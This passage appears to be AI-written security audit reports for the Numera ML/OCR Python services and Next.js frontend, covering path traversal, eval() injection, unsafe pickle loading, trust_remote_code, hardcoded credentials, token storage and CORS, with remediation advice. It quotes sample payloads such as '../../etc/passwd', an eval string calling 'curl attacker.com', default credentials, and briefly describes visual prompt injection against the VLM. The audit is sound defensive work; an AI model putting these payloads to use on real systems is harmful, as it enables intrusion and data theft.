+- `F:\Context\ml-service\app\api\pipeline_models.py`, line 29-30: `document_id: str`, `storage_path: str`
+- `F:\Context\ocr-service\app\api\ocr.py`, line 33: `password: str | None = None` -- no length limit
+- `F:\Context\ocr-service\app\api\models.py`, line 35: `OcrRequest.storage_path: str`
+- `F:\Context\ml-service\app\api\models.py`, line 78-79: `ZoneClassificationRequest.document_id`, `tables: list[DetectedTable]` -- no max_items on the list
+
+An attacker could send extremely large payloads to exhaust memory. FastAPI's default max body size is unbounded unless explicitly configured.
+
+---
+
+## 2. INPUT VALIDATION
+
+### 2.1 CRITICAL: Path Traversal in Local Storage Client
+
+**ocr-service** -- `F:\Context\ocr-service\app\services\storage_client.py`, line 54:
+```python
+local_file = Path(self._local_path) / path
+```
+
+The `path` parameter comes directly from `request.storage_path` in the API request (e.g., `ocr.py` line 86: `storage.download(request.storage_path)`). There is **no sanitization** against path traversal sequences like `../../etc/passwd`. An attacker could read arbitrary files from the server's filesystem when local storage mode is active.
+
+### 2.2 CRITICAL: `eval()` Used for Validation Formula Execution
+
+**ml-service** -- `F:\Context\ml-service\app\api\expressions.py`, line 241:
+```python
+computed = eval(expr)  # Safe: only numbers and operators
+```
+
+The comment claims this is safe, but it is **not safe**. The `expr` string is built by substituting values into template validation formulas (lines 227-229):
+```python
+expr = formula
+for item_id, value in values.items():
+    expr = expr.replace(f"{{{item_id}}}", str(value or 0))
+```
+
+If a model template JSON file contains a malicious `formula` field (e.g., `__import__('os').system('curl attacker.com')`), it will be executed as Python code. The template files are loaded from disk (`_get_template()`) and could be tampered with. Additionally, `str(value or 0)` could inject arbitrary Python if a value somehow contains executable syntax.
+
+### 2.3 CRITICAL: Unsafe Pickle Loading in Embeddings Cache
+
+**ml-service** -- `F:\Context\ml-service\app\ml\embeddings_cache.py`, line 50:
+```python
+data = np.load(path, allow_pickle=True)
+```
+
+`allow_pickle=True` enables arbitrary code execution when loading `.npz` files. If an attacker can write a malicious `.npz` file to the cache directory (`/app/models/embeddings_cache`), they achieve remote code execution when the cache is read.
+
+### 2.4 MEDIUM: Template ID Used for Filesystem Access Without Sanitization
+
+**ml-service** -- `F:\Context\ml-service\app\api\fingerprint.py`, lines 174-176:
+```python
+candidate = directory / f"{template_id.replace('-', '_')}.json"
+```
+
+And `F:\Context\ml-service\app\api\expressions.py`, lines 45-46:
+```python
+path = d / f"{template_id.replace('-', '_')}.json"
+```
+
+The `template_id` comes from API request bodies and is used to construct file paths. While `replace('-', '_')` provides minimal sanitization, it does not protect against path traversal (e.g., `template_id = "../../etc/shadow"` would become `../../../etc/shadow_.json` which could still escape the directory).
+
+### 2.5 MEDIUM: No File Type/Size Validation on Downloaded Documents
+
+**ocr-service** -- `F:\Context\ocr-service\app\api\ocr.py`, lines 84-89:
+```python
+pdf_bytes = storage.download(request.storage_path)
+```
+
+Downloaded files are passed directly to PyMuPDF (`fitz.open(stream=pdf_bytes)`) without any file size limit or content-type validation. A very large file could cause memory exhaustion. The only format check is heuristic (checking for DOCX/XLSX magic bytes at lines 94-95).
+
+### 2.6 LOW: Unbounded Batch Sizes in Some Endpoints
+
+- `F:\Context\ml-service\app\api\feedback.py`, line 83: `limit: int = Query(10000, ge=1, le=100000)` -- allows up to 100K records export
+- `F:\Context\ml-service\app\api\anomaly_detection.py`, line 41: `max_length=100` -- batch of 100 anomaly requests
+- `F:\Context\ml-service\app\api\rsbsn_prediction.py`, line 60: batch size limited to 50 -- reasonable
+
+---
+
+## 3. MODEL SECURITY
+
+### 3.1 HIGH: `trust_remote_code=True` Enables Arbitrary Code Execution from Model Repositories
+
+**ocr-service** -- `F:\Context\ocr-service\app\ml\vlm_processor.py`, line 66:
+```python
+load_kwargs = {
+    "trust_remote_code": True,
+    "device_map": self.device,
+}
+```
+
+And line 96-98:
+```python
+self.processor = AutoProcessor.from_pretrained(
+    self.model_id, trust_remote_code=True
+)
+```
+
+`trust_remote_code=True` allows HuggingFace model repositories to execute arbitrary Python code during model loading. If a model repository is compromised (model poisoning) or a malicious model_id is configured, this results in remote code execution.
+
+### 3.2 HIGH: Model Loading from MLflow Without Integrity Verification
+
+**ml-service** -- `F:\Context\ml-service\app\services\model_manager.py`, lines 53-72:
+```python
+model_uri = f"models:/{model_name}/{stage}"
+local_path = mlflow.artifacts.download_artifacts(
+    artifact_uri=model_uri,
+    dst_path=str(self.cache_dir / model_name / stage),
+)
+```
+
+Models are downloaded from MLflow and loaded without any integrity check (no hash verification, no signature validation). A compromised MLflow server or man-in-the-middle attack (MLflow runs on HTTP by default) could inject malicious model weights or code.
+
+### 3.3 MEDIUM: VLM Output Parsed Without Strict Schema Validation
+
+**ocr-service** -- `F:\Context\ocr-service\app\ml\vlm_processor.py`, lines 272-286:
+```python
+@staticmethod
+def _parse_json_response(text: str, fallback: dict | None = None) -> dict:
+    try:
+        return json.loads(text)
+    except json.JSONDecodeError:
+        ...
+        return {"tables": [], "page_text": text, "page_type": "parse_error"}
+```
+
+VLM-generated content is parsed as JSON but not validated against a schema. Since VLM output can be influenced by adversarial content in the processed document images (a form of visual prompt injection), an attacker could craft a document that causes the VLM to produce JSON with unexpected fields or values that propagate through the system.
+
+### 3.4 LOW: VLM Custom Prompt Parameter
+
+**ocr-service** -- `F:\Context\ocr-service\app\ml\vlm_processor.py`, line 111:
+```python
+def extract_page(self, image, page_number, prompt: str | None = None):
+```
+
+The `prompt` parameter allows custom prompts to be injected. While currently only called internally with hardcoded prompts, if a future API endpoint exposes this parameter, it could enable prompt injection attacks against the VLM.
+
+---
+
+## 4. DATA LEAKAGE
+
+### 4.1 HIGH: Exception Details Exposed When Debug Mode is Enabled
+
+**Both services** -- `F:\Context\ml-service\app\main.py`, lines 127-131 and `F:\Context\ocr-service\app\main.py`, lines 147-151:
+```python
+return JSONResponse(
+    status_code=500,
+    content={
+        "error": "internal_server_error",
+        "detail": str(exc) if settings.debug else "An internal error occurred.",
+    },
+)
+```
+
+If `debug=True` is ever set in production (via `ML_DEBUG` or `OCR_DEBUG` env var), full exception messages including stack traces, internal paths, SQL queries, and library internals are returned to clients.
+
+### 4.2 MEDIUM: Storage Paths Leaked in Error Responses
+
+**ocr-service** -- `F:\Context\ocr-service\app\api\ocr.py`, line 87:
+```python
+raise HTTPException(status_code=404, detail=f"File not found: {request.storage_path}")
+```
+
+And `F:\Context\ocr-service\app\api\tables.py`, line 59:
+```python
+raise HTTPException(status_code=404, detail=f"File not found: {request.storage_path}")
+```
+
+These responses reveal the internal storage path structure to attackers, aiding path traversal attacks.
+
+### 4.3 MEDIUM: Internal Error Details in Non-Debug Responses
+
+**ocr-service** -- `F:\Context\ocr-service\app\api\ocr.py`, line 89:
+```python
+raise HTTPException(status_code=502, detail=f"Storage error: {exc}")
+```
+
+And `F:\Context\ocr-service\app\api\tables.py`, line 61:
+```python
+raise HTTPException(status_code=502, detail=f"Storage error: {exc}")
+```
+
+Even without debug mode, these endpoints leak raw exception messages which may include MinIO endpoint URLs, bucket names, or connection errors.
+
+### 4.4 MEDIUM: Health Endpoints Expose Infrastructure Details
+
+**ml-service** -- `F:\Context\ml-service\app\api\health.py`, lines 20-56: Exposes model load states (production + staging), A/B testing status, PostgreSQL health, device info, and uptime.
+
+**ocr-service** -- `F:\Context\ocr-service\app\api\health.py`, lines 15-38: Exposes model versions, language settings, GPU/CPU status, and uptime.
+
+While these are behind the health endpoint (unauthenticated by design), they reveal too much about the internal architecture.
+
+### 4.5 LOW: Feedback Export Exports All Correction Data
+
+**ml-service** -- `F:\Context\ml-service\app\api\feedback.py`, lines 78-120: The export endpoint returns all stored correction data including `source_text` (the original document text), `analyst_id`, and `tenant_id`. Up to 100,000 records can be exported in a single call.
+
+---
+
+## 5. NETWORK SECURITY
+
+### 5.1 HIGH: Internal Service Communication Over HTTP
+
+**ml-service** -- `F:\Context\ml-service\app\config.py`, line 62:
+```python
+ocr_service_url: str = "http://ocr-service:8001"
+```
+
+And line 22:
+```python
+mlflow_uri: str = "http://localhost:5000"
+```
+
+**ocr-service** -- `F:\Context\ocr-service\app\services\storage_client.py`, line 27:
+```python
+endpoint_url=f"http{'s' if settings.minio_secure else ''}://{settings.minio_endpoint}",
+```
+
+With `minio_secure: bool = False` (`F:\Context\ocr-service\app\config.py`, line 21), MinIO connections are unencrypted by default. All inter-service traffic (ML-to-OCR, ML-to-MLflow, OCR-to-MinIO) transits in cleartext, vulnerable to network sniffing.
+
+### 5.2 HIGH: Overly Permissive CORS Configuration
+
+**Both services** -- `F:\Context\ml-service\app\main.py`, lines 108-114 and `F:\Context\ocr-service\app\main.py`, lines 128-134:
+```python
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=settings.cors_origin_list,
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+```
+
+Combined with `cors_origins: str = "*"` (ml-service/config.py:34, ocr-service/config.py:62), this means:
+- **Any origin** can make cross-origin requests
+- **Credentials are allowed** (`allow_credentials=True`)
+- **All HTTP methods and headers** are permitted
+
+The combination of `allow_origins=["*"]` and `allow_credentials=True` is actually rejected by browsers (spec violation), but Starlette/FastAPI silently allows the wildcard with credentials, creating an inconsistent security posture.
+
+### 5.3 CRITICAL: Hardcoded Database and Storage Credentials
+
+**ml-service** -- `F:\Context\ml-service\app\config.py`, lines 17-19, 47-48:
+```python
+minio_access_key: str = "minioadmin"
+minio_secret_key: str = "minioadmin"
+...
+pg_user: str = "numera"
+pg_password: str = "numera"
+```
+
+**ocr-service** -- `F:\Context\ocr-service\app\config.py`, lines 17-19:
+```python
+minio_access_key: str = "minioadmin"
+minio_secret_key: str = "minioadmin"
+```
+
+These are the well-known default credentials for MinIO and a weak database password. If environment variables are not set, services will authenticate with these credentials.
+
+### 5.4 MEDIUM: Services Bind to All Interfaces
+
+**Both services** -- `F:\Context\ml-service\app\config.py`, line 9 and `F:\Context\ocr-service\app\config.py`, line 9:
+```python
+host: str = "0.0.0.0"
+```
+
+Both services listen on all network interfaces by default. In a containerized environment, this is common, but if containers are misconfigured with host networking, the services are exposed on all interfaces without additional firewalling.
+
+---
+
+## 6. DEPENDENCY ISSUES
+
+### 6.1 MEDIUM: Wildcard Version Constraints Allow Vulnerable Versions
+
+**ml-service** -- `F:\Context\ml-service\requirements.txt`:
+```
+fastapi==0.115.*
+torch==2.6.*
+transformers==4.50.*
+numpy==2.2.*
+```
+
+**ocr-service** -- `F:\Context\ocr-service\requirements.txt`:
+```
+fastapi==0.115.*
+torch==2.6.*
+transformers==4.50.*
+paddlepaddle==3.0.*
+```
+
+Wildcard version pins (`.*`) mean any patch/minor version matching the prefix can be installed. This allows known-vulnerable patch versions to be pulled in without any barrier. Notable concerns:
+- **PyMuPDF==1.25.***: PyMuPDF has had CVEs related to memory corruption in PDF parsing
+- **Pillow==11.***: Pillow has historically had image decoding vulnerabilities
+- **paddlepaddle==3.0.***: PaddlePaddle has had multiple CVEs
+
+### 6.2 LOW: No Dependency Scanning Configuration
+
+No `pip-audit`, `safety`, or `Snyk` configuration exists in either service. There are no CI/CD security scanning steps visible.
+
+---
+
+## 7. ADDITIONAL FINDINGS
+
+### 7.1 HIGH: Unbounded In-Memory Storage (DoS Risk)
+
+**ml-service** -- `F:\Context\ml-service\app\api\knowledge_graph.py`, line 22:
+```python
+_store: dict[str, KnowledgeGraph] = {}
+```
+
+Knowledge graphs are stored in an unbounded in-memory dictionary with no eviction policy, no size limit, and no TTL. An attacker can repeatedly POST to `/api/ml/knowledge-graph/build` with arbitrary data to exhaust server memory.
+
+Similarly, **ml-service** -- `F:\Context\ml-service\app\api\fingerprint.py`, line 17:
+```python
+_template_cache: dict[str, list[dict]] = {}
+```
+
+Template cache grows without bounds as new template_ids are requested.
+
+### 7.2 MEDIUM: Denial of Service via PDF Processing
+
+**ocr-service** -- `F:\Context\ocr-service\app\utils\pdf_utils.py`, line 329:
+```python
+def pdf_to_images(pdf_bytes: bytes, dpi: int = 300, ...):
+```
+
+And `F:\Context\ocr-service\app\api\ocr.py`, line 36:
+```python
+class OcrRequest(BaseModel):
+    ...
+    pages: list[int] | None = None
+```
+
+There is no limit on the number of pages to process. A 10,000-page PDF at 300 DPI would consume enormous memory (each page rendered as a high-resolution image). The `dpi` parameter is also user-controllable indirectly through config but is hardcoded to 300 in the `pdf_to_images` call.
+
+### 7.3 MEDIUM: No CSRF Protection
+
+Neither service implements CSRF protection. While API-key-based auth provides some protection for API-to-API calls, the combination of permissive CORS and cookie-based authentication (if added) would be vulnerable.
+
+### 7.4 LOW: OpenAPI Documentation Exposed Without Authentication
+
+**Both services** -- `F:\Context\ml-service\app\middleware\api_key_auth.py`, line 16 and `F:\Context\ocr-service\app\middleware\api_key_auth.py`, line 16:
+```python
+PUBLIC_PATHS = frozenset({"/api/ml/health", "/api/ocr/health", "/docs", "/openapi.json", "/redoc"})
+```
+
+The full API schema is accessible without authentication at `/docs`, `/openapi.json`, and `/redoc`, revealing all endpoint paths, request/response schemas, and data models.
+
+### 7.5 LOW: Inconsistent API Key Middleware Between Services
+
+**ml-service** -- `F:\Context\ml-service\app\middleware\api_key_auth.py`, line 16:
+```python
+PUBLIC_PATHS = frozenset({"/api/ml/health", "/api/ocr/health", "/docs", "/openapi.json", "/redoc"})
+```
+
+The ML service's middleware includes `/api/ocr/health` as a public path, but the ML service does not serve OCR endpoints. This is a minor inconsistency but indicates the public path list may have been copy-pasted without careful review.
+
+---
+
+## Summary of Findings by Severity
+
+| Severity | Count | Key Findings |
+|----------|-------|-------------|
+| **CRITICAL** | 4 | `eval()` code execution (expressions.py:241), `allow_pickle=True` (embeddings_cache.py:50), path traversal (storage_client.py:54), hardcoded credentials (config.py in both) |
+| **HIGH** | 7 | `trust_remote_code=True` (vlm_processor.py:66), timing-attack auth (api_key_auth.py:39), no rate limiting, HTTP inter-service (config.py:22,62), permissive CORS (main.py:108-114), MLflow model poisoning (model_manager.py:53-72), unbounded in-memory store (knowledge_graph.py:22) |
+| **MEDIUM** | 10 | Debug mode detail leakage (main.py:129), storage path leakage (ocr.py:87), no request size limits, no file type validation, template path traversal (fingerprint.py:174), HTTP MinIO default, bind 0.0.0.0, wildcard deps, DoS via large PDFs, health endpoint info leakage |
+| **LOW** | 5 | OpenAPI exposed, auth bypass via env var, VLM custom prompt parameter, inconsistent public paths, no CSRF protection |
+
+### Top Priority Remediation Items
+
+1. **Remove `eval()`** in `expressions.py:241` -- replace with `ast.literal_eval()` or a safe math expression evaluator.
+2. **Remove `allow_pickle=True`** in `embeddings_cache.py:50` -- use `np.load(path, allow_pickle=False)`.
+3. **Add path traversal protection** in `storage_client.py:54` -- validate that resolved paths stay within the storage root.
+4. **Remove insecure default credentials** from both `config.py` files -- require environment variables with no defaults for secrets.
+5. **Replace `!=` with `hmac.compare_digest()`** in both `api_key_auth.py` files.
+6. **Remove `trust_remote_code=True`** or add explicit model hash verification in `vlm_processor.py`.
+7. **Add rate limiting middleware** to both services.
+8. **Lock CORS to specific origins** and remove `allow_credentials=True` with wildcard origins.
+9. **Switch internal communication to HTTPS** or use service mesh encryption.
+10. **Pin dependency versions** and add security scanning to CI/CD.
+Now I have a comprehensive picture of the codebase. Here is the full security audit report.
+
+---
+
+# Security Audit Report: numera-ui
+
+## 1. XSS Vulnerabilities
+
+### 1.1 [LOW] No dangerouslySetInnerHTML Found
+No usage of `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, or `__html` was found anywhere in the codebase. React's default JSX escaping is used consistently for rendering data. This is a positive finding.
+
+### 1.2 [HIGH] Email Template Body Accepts Arbitrary HTML Without Sanitization
+**File:** `F:\Context\numera-ui\src\app\(dashboard)\email-templates\page.tsx`, line 75
+
+```typescript
+<div className="input-group" style={{ marginTop: 12 }}>
+  <label>Body HTML</label>
+  <textarea className="input" rows={8} value={bodyHtml} onChange={(e) => setBodyHtml(e.target.value)} />
+</div>
+```
+
+The `bodyHtml` state (line 19: `const [bodyHtml, setBodyHtml] = useState('<p>Hello {{CUSTOMER_NAME}}</p>')`) is sent directly to the backend at line 89 with zero client-side sanitization. A malicious user can inject `<script>` tags, event handlers (`onerror`, `onload`), or other attack payloads into the template HTML. If the backend renders this HTML in emails or a preview without sanitization, this is a **stored XSS** vector against email recipients.
+
+### 1.3 [MEDIUM] Waiver Letter Content Rendered Without HTML Sanitization Context
+**File:** `F:\Context\numera-ui\src\components\covenant\LetterPreview.tsx`, line 21-28
+
+```typescript
+<textarea
+  className="input"
+  rows={18}
+  value={content}
+  onChange={(e) => onChange(e.target.value)}
+  ...
+/>
+```
+
+The `LetterPreview` receives `bodyHtml` from the server (via `WaiverLetterResponse.bodyHtml` at `F:\Context\numera-ui\src\app\(dashboard)\covenants\[itemId]\waiver\page.tsx`, line 77: `setLetterContent(generated.bodyHtml)`) and displays it in a textarea. While a textarea is safe, the fact that the content is server-generated HTML that can be edited client-side and then sent (line 99: `message: letterContent`) means if this component is ever changed to render HTML directly (e.g., using an iframe or dangerouslySetInnerHTML for WYSIWYG), it would immediately become an XSS vector. The architecture lacks a sanitization layer.
+
+---
+
+## 2. Token Storage
+
+### 2.1 [CRITICAL] Both Access and Refresh Tokens Stored in localStorage
+**File:** `F:\Context\numera-ui\src\stores\authStore.ts`, line 39
+
+```typescript
+{ name: 'numera-auth', partialize: (s) => ({ accessToken: s.accessToken, refreshToken: s.refreshToken, user: s.user }) }
+```
+
+Zustand's `persist` middleware stores `accessToken`, `refreshToken`, and the full `user` object (including `tenantId` and `roles`) in `localStorage` under the key `numera-auth`. This is the highest-severity finding:
+- **localStorage is fully accessible to any JavaScript** on the page -- a single XSS vulnerability allows full token exfiltration.
+- **Refresh tokens in localStorage** are especially dangerous: they grant long-lived access (the refresh token is used to obtain new access tokens at `F:\Context\numera-ui\src\services\api.ts`, lines 25-52).
+- The user object stored includes `tenantId` and `roles`, enabling tenant impersonation if exfiltrated.
+
+### 2.2 [HIGH] Auth Cookie Is Not httpOnly
+**File:** `F:\Context\numera-ui\src\stores\authStore.ts`, line 26
+
+```typescript
+document.cookie = `numera-auth=${accessToken}; path=/; max-age=86400; SameSite=Lax; Secure`
+```
+
+The `numera-auth` cookie is set client-side with `Secure` and `SameSite=Lax` flags (good), but it is **not `httpOnly`**. This means:
+- The cookie value is readable by any JavaScript via `document.cookie`.
+- It provides no additional protection over localStorage against XSS.
+- The same pattern is repeated in the token refresh logic at `F:\Context\numera-ui\src\services\api.ts`, line 46.
+
+### 2.3 [HIGH] JWT Token Passed in WebSocket URL Query String
+**File:** `F:\Context\numera-ui\src\services\websocket.ts`, line 77
+
+```typescript
+const query = this.token ? `?token=${encodeURIComponent(this.token)}` : ''
+return new SockJS(`${this.baseUrl}${query}`)
+```
+
+The access token is appended to the WebSocket URL as a query parameter. This is a well-known security anti-pattern because:
+- URLs are logged by web servers, proxies, load balancers, and CDN access logs.
+- The `Referer` header may leak the URL (and thus the token) to third-party sites.
+- Browser history may retain the URL.
+- While `encodeURIComponent` is used, this only prevents URL parsing issues, not token exposure.
+
+### 2.4 [MEDIUM] Direct localStorage Manipulation Bypasses Store
+**File:** `F:\Context\numera-ui\src\services\api.ts`, lines 12-22 and 34-44
+
+```typescript
+// Line 12: Reading
+const raw = localStorage.getItem('numera-auth')
+const state = JSON.parse(raw)?.state
+
+// Line 44: Writing
+localStorage.setItem('numera-auth', JSON.stringify(parsed))
+```
+
+The `getAuthSnapshot()` and `tryRefresh()` functions directly read from and write to `localStorage`, bypassing the Zustand store. This creates a dual-state problem where:
+- The Zustand store and localStorage can become out of sync.
+- There's no validation on the parsed state before using the tokens.
+- If localStorage is tampered with (via dev tools or XSS), malformed data flows directly into auth headers.
+
+### 2.5 [MEDIUM] Duplicate getAuthHeaders() Functions Bypass Central API Layer
+**File:** `F:\Context\numera-ui\src\services\covenantApi.ts`, lines 62-77
+**File:** `F:\Context\numera-ui\src\services\adminApi.ts`, lines 25-40
+
+Both files contain an identical `getAuthHeaders()` function that reads directly from localStorage:
+```typescript
+function getAuthHeaders(): Record<string, string> {
+  const raw = localStorage.getItem('numera-auth')
+  const state = JSON.parse(raw)?.state
+  // ...
+}
+```
+
+These are used for direct `fetch()` calls (waiver letter download, taxonomy export) that bypass the central `fetchApi()` function in `api.ts`. This means:
+- The 401/refresh logic in `fetchApi` is completely bypassed.
+- If the access token is expired, these calls will fail without attempting a refresh.
+- This is a code duplication issue that increases the attack surface.
+
+---
+
+## 3. API Security
+
+### 3.1 [HIGH] No CSRF Protection
+A search for `csrf`, `xsrf`, `CSRF`, `XSRF` across the entire `src/` directory returned **zero results**. The codebase has no CSRF token mechanism whatsoever.
+
+While Bearer token authentication in the `Authorization` header provides inherent CSRF protection (browsers don't automatically add this header), the **`numera-auth` cookie** changes the calculus:
+- If the backend accepts the `numera-auth` cookie as an alternative authentication mechanism, state-changing requests (POST, PUT, DELETE) could be forged.
+- The `SameSite=Lax` flag only protects against cross-site GET requests triggered by top-level navigations, not cross-site form submissions for POST requests from subdomains.
+
+### 3.2 [HIGH] Report Export Opens Unauthenticated Window
+**File:** `F:\Context\numera-ui\src\app\(dashboard)\reports\page.tsx`, line 12
+
+```typescript
+window.open(`/api/reports/export?format=${encodeURIComponent(format)}`, '_blank')
+```
+
+This opens a new browser tab to download a report. The request will carry cookies but **not** the `Authorization` header. If the backend requires Bearer auth, the download will fail. If the backend falls back to cookie auth, this endpoint becomes vulnerable to CSRF since there's no CSRF token.
+
+### 3.3 [MEDIUM] Sensitive Data Exposed in Client-Side State
+- **localStorage** contains: `accessToken`, `refreshToken`, `user.id`, `user.email`, `user.fullName`, `user.tenantId`, `user.roles` (at `F:\Context\numera-ui\src\stores\authStore.ts`, line 39).
+- **React Query cache** (in memory) contains all API response data including: customer records, financial spreading data, covenant details, breach probabilities, user lists (with emails), waiver letters (with HTML content), and audit trail data.
+- The user object at `F:\Context\numera-ui\src\types\auth.ts` exposes `tenantId` and `roles` client-side, which are better suited for server-side session management.
+
+---
+
+## 4. Content Security
+
+### 4.1 [CRITICAL] No Security Headers Configured
+**File:** `F:\Context\numera-ui\next.config.ts`
+
+```typescript
+const nextConfig: NextConfig = {
+  output: undefined,
+  outputFileTracingRoot: path.join(__dirname, '../'),
+  async rewrites() { ... },
+  experimental: { },
+}
+```
+
+The Next.js configuration has **zero security headers**. There is no `headers()` function returning:
+- `Content-Security-Policy` -- absent, allowing unlimited script/style execution
+- `X-Frame-Options` -- absent, allowing clickjacking
+- `X-Content-Type-Options` -- absent, allowing MIME-type sniffing
+- `Strict-Transport-Security` -- absent, no HSTS enforcement
+- `Referrer-Policy` -- absent, potentially leaking referrer data
+- `Permissions-Policy` -- absent, browser features unrestricted
+
+### 4.2 [HIGH] PDF.js Worker Loaded from Third-Party CDN Without SRI
+**File:** `F:\Context\numera-ui\src\components\spreading\PdfViewer.tsx`, line 7
+
+```typescript
+pdfjsLib.GlobalWorkerOptions.workerSrc = `//cdnjs.cloudflare.com/ajax/libs/pdf.js/${pdfjsLib.version}/pdf.worker.min.js`
+```
+
+This loads a JavaScript worker from `cdnjs.cloudflare.com` without Sub-Resource Integrity (SRI). Without CSP (which is also missing) and without SRI:
+- If the CDN is compromised, arbitrary code execution follows.
+- The protocol-relative URL (`//`) could downgrade to HTTP on non-HTTPS pages.
+
+### 4.3 [MEDIUM] Pervasive Inline Styles Complicate CSP Deployment
+The entire codebase uses extensive inline `style` attributes (e.g., `style={{ display: 'flex', gap: 8 }}` on virtually every element). Deploying a strict `Content-Security-Policy` with `style-src` would require `unsafe-inline`, which significantly weakens CSP protection against style-based data exfiltration attacks.
+
+---
+
+## 5. Input Validation
+
+### 5.1 [CRITICAL] Hardcoded Default Credentials in Login Form
+**File:** `F:\Context\numera-ui\src\app\(auth)\login\page.tsx`, lines 29-32
+
+```typescript
+defaultValues: {
+  email: 'analyst@numera.ai',
+  password: 'Password123!',
+}
+```
+
+The login form has **hardcoded default credentials** pre-populated in the form fields. This means:
+- Anyone accessing the login page sees valid credentials.
+- If these credentials work on the backend, this is a complete authentication bypass.
+- Even if they don't work in production, they reveal the expected credential format and potentially the default test account.
+- The password `Password123!` is a weak, commonly-known pattern.
+
+### 5.2 [MEDIUM] Customer Creation Form Lacks Comprehensive Validation
+**File:** `F:\Context\numera-ui\src\app\(dashboard)\customers\page.tsx`, lines 24-47
+
+```typescript
+const onCreate = async () => {
+  if (!customerCode || !name) {
+    showToast('Customer code and name are required', 'error')
+    return
+  }
+  // No validation on industry, country, relationshipManager
+  // No max length constraints
+  // No input sanitization
+}
+```
+
+Only `customerCode` and `name` are validated as non-empty. There are no length constraints, format validation, or sanitization on any field. This differs from the login form and waiver form which properly use Zod schemas.
+
+### 5.3 [MEDIUM] Admin User Creation Lacks Email and Name Validation
+**File:** `F:\Context\numera-ui\src\app\(dashboard)\admin\users\page.tsx`, lines 45-47
+
+```typescript
+<div className="input-group"><label>Email</label><input className="input" value={email} onChange={(e) => setEmail(e.target.value)} /></div>
+<div className="input-group"><label>Full Name</label><input className="input" value={fullName} onChange={(e) => setFullName(e.target.value)} /></div>
+```
+
+No Zod schema, no `type="email"` attribute, no validation at all on the email or name fields. The login form properly uses Zod with `z.string().email()`, but the admin user creation form does not.
+
+### 5.4 [LOW] Route Parameters Used Without Validation
+**File:** `F:\Context\numera-ui\src\app\spreading\[spreadId]\page.tsx`, line 39
+**File:** `F:\Context\numera-ui\src\app\(dashboard)\covenants\[itemId]\waiver\page.tsx`, line 45
+
+```typescript
+const spreadId = params.spreadId  // No format validation
+const itemId = String(params.itemId ?? '')  // No format validation
+```
+
+Route parameters are used directly in API calls without UUID format validation. While the backend should validate, client-side validation would provide defense-in-depth against injection attacks.
+
+---
+
+## 6. Dependency Issues
+
+### 6.1 [MEDIUM] sockjs-client v1.6.1 Is Deprecated and Potentially Vulnerable
+**File:** `F:\Context\numera-ui\package.json`, line 33
+
+```json
+"sockjs-client": "^1.6.1"
+```
+
+`sockjs-client` is no longer actively maintained. The npm package has known issues and the repository has been archived. It should be replaced with native WebSocket or a maintained alternative.
+
+### 6.2 [LOW] No npm audit Evidence
+There is no `npm audit` step in the build scripts, CI configuration, or Dockerfile. The `package-lock.json` exists but there is no evidence that dependency vulnerability scanning is part of the development workflow.
+
+### 6.3 [LOW] Dual Build System (Vite + Next.js)
+**File:** `F:\Context\numera-ui\package.json`, lines 6-11
+
+```json
+"scripts": {
+  "dev": "next dev",
+  "build": "next build",
+  "start": "next start",
+  "lint": "next lint",
+  "vite:dev": "vite",
+  "vite:build": "tsc -b && vite build"
+}
+```
+
+The project has both Vite and Next.js configurations coexisting. This suggests an incomplete migration and could lead to security misconfigurations (e.g., the Vite config at `F:\Context\numera-ui\vite.config.ts` has no security settings and the `vite:dev` script may bypass Next.js middleware protections).
+
+---
+
+## 7. Additional Findings
+
+### 7.1 [MEDIUM] Middleware Auth Check Is Token-Presence Only, Not Validation
+**File:** `F:\Context\numera-ui\src\middleware.ts`, line 12
+
+```typescript
+const token = req.cookies.get('numera-auth')?.value
+if (!token && !isAuthRoute) {
+  return NextResponse.redirect(new URL('/login', req.url))
+}
+```
+
+The middleware only checks if the `numera-auth` cookie **exists**, not whether the JWT is valid, unexpired, or properly signed. Any non-empty string in the cookie will pass this check. While the client-side `AuthGuard` does check token expiration (`F:\Context\numera-ui\src\components\providers\AuthGuard.tsx`, line 21), this is client-side enforcement that can be bypassed.
+
+### 7.2 [LOW] Console Logging in Production-Bound Code
+**File:** `F:\Context\numera-ui\src\services\api.ts`, lines 72-74 and 104-106
+
+```typescript
+if (process.env.NODE_ENV !== 'production') {
+  console.debug('[api:req]', options.method ?? 'GET', url)
+}
+```
+
+The `console.debug` calls are gated behind a `NODE_ENV` check, which is good. However, the WebSocket service logs errors unconditionally:
+
+**File:** `F:\Context\numera-ui\src\services\websocket.ts`, lines 97, 100, 118
+```typescript
+console.warn('[WS] STOMP error:', frame.headers['message'], frame.body)
+console.warn('[WS] Transport error')
+console.error('[WS] Handler error:', err)
+```
+
+And the PdfViewer logs errors unconditionally:
+
+**File:** `F:\Context\numera-ui\src\components\spreading\PdfViewer.tsx`, lines 48, 83
+```typescript
+console.error('Error loading PDF:', error)
+console.error('Error rendering page:', error)
+```
+
+These could leak internal state or error details in the browser console.
+
+### 7.3 [LOW] .env.local Contains No Secrets But Is Present
+**File:** `F:\Context\numera-ui\.env.local`
+
+```
+BACKEND_URL=http://localhost:8080
+NEXT_PUBLIC_APP_NAME=Numera
+NEXT_PUBLIC_WS_URL=ws://localhost:8080/ws
+```
+
+The `.env.local` file is properly gitignored (`*.local` pattern in `.gitignore`, line 13). The current contents are benign. However, `NEXT_PUBLIC_*` variables are embedded in client-side bundles and are visible to end users. The `NEXT_PUBLIC_WS_URL` using `ws://` (not `wss://`) in development is acceptable, but care should be taken not to commit production WebSocket URLs.
+
+---
+
+## Summary Table
+
+| # | Severity | Category | Finding |
+|---|----------|----------|---------|
+| 2.1 | CRITICAL | Token Storage | Access + refresh tokens in localStorage |
+| 5.1 | CRITICAL | Input Validation | Hardcoded credentials in login form |
+| 4.1 | CRITICAL | Content Security | No security headers configured |
+| 1.2 | HIGH | XSS | Email template HTML unsanitized |
+| 2.2 | HIGH | Token Storage | Cookie not httpOnly |
+| 2.3 | HIGH | Token Storage | JWT in WebSocket URL query string |
+| 3.1 | HIGH | API Security | No CSRF protection |
+| 3.2 | HIGH | API Security | Report export opens unauthenticated window |
+| 4.2 | HIGH | Content Security | PDF.js worker from CDN without SRI |
+| 1.3 | MEDIUM | XSS | Waiver letter HTML lacks sanitization layer |
+| 2.4 | MEDIUM | Token Storage | Direct localStorage manipulation bypasses store |
+| 2.5 | MEDIUM | API Security | Duplicate getAuthHeaders() bypass central API layer |
+| 3.3 | MEDIUM | API Security | Sensitive data in client-side state |
